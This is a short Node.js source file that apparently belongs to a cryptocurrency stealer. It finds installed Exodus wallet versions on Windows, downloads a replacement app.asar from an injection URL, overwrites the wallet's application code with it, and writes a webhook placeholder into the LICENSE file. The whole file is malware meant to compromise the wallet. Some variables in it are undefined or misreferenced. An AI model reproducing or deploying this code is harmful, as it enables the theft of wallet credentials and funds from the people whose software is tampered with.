const fs = require("fs");
const path = require("path");
const axios = require("axios");

var config = {
    webhook: "%WEBHOOK%"
};


async function injectExodus() {
    const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
    const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));

    for (const exodusDir of exodusDirs) {
        const exodusPathWithVersion = path.join(exodusPath, exodusDir);
        const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
        const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');

        await inject(exodusPath, exodusAsarPath, exodusInjectionUrl, exodusLicensePath);
    }
}

async function inject(appPath, asarPath, injectionUrl, licensePath) {
    if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) {
        return;
    }

    try {
        const response = await axios.get(injectionUrl, { responseType: 'stream' });

        if (response.status !== 200) {
            return;
        }

        const writer = fs.createWriteStream(asarPath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        if (licensePath) {
            fs.writeFileSync(licensePath, webhook);
        }
    } catch (error) {
        console.error('Error during injection:', error);
    }
}
